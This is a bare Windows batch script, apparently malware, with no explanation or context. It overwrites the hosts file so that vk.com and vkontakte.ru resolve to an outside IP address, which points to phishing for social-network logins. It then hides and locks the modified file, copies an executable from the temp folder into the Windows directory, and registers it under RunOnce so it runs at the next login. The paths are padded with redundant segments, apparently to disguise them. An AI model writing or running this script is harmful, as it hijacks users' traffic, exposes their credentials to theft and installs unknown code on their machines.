@cd %windir%\.\.\.\
@cd system32\.\.\.\drivers\.\.\.\
@cd etc\.\.\.\
@attrib -A -R -H -S hosts
@del hosts
@echo 127.0.0.1  localhost > hosts
@echo 92.38.209.182  vk.com >> hosts
@echo 92.38.209.182  vkontakte.ru >> hosts
@attrib +S +R +H hosts
@copy %temp%\.\.\122234234.exe %windir%\.\.\122234234.exe >> nul
@reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /ve /d "122234234.exe" /f >> nul